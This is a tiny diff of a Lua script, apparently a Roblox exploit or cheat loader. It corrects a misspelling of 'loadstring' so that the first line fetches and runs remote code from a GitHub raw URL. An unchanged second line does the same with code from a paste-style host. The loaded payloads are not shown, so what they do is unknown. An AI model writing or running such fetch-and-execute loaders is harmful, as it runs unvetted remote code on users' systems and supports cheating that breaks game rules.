@@ -1,4 +1,4 @@
-loadstsing(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/loader/refs/heads/main/anti"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/loader/refs/heads/main/anti"))()
 task.wait(1)
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/WAxJ8MoGbKixWsnR/raw", true))()
 
